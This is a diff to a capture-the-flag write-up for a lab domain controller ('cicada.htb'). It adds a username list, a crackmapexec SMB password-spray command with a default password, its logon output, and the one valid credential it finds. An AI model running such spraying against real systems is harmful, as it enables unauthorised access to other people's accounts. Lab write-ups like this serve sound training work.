@@ -273,25 +273,40 @@ SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (S
 
 <br />
 
-There are a lot of users in the output.
+There are a lot of users available.
 
 We select the most interesting and put them into a file called `users.txt`:
 
 <br />
 
 ```bash
-
+Administrator
+john.smoulder
+sarah.dantelia
+michael.wrightson
+david.orelious
+Dev
+emily.oscars
 ```
 
 <br />
 
-Now, we can try the default password for every user in the file:
+Now, we can try the `default password` for every user in the file:
 
 <br />
 
 ```bash
-
+❯ cme smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
 ```
+
+<br />
+
+We have valid credentials: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
 
 <br />
 
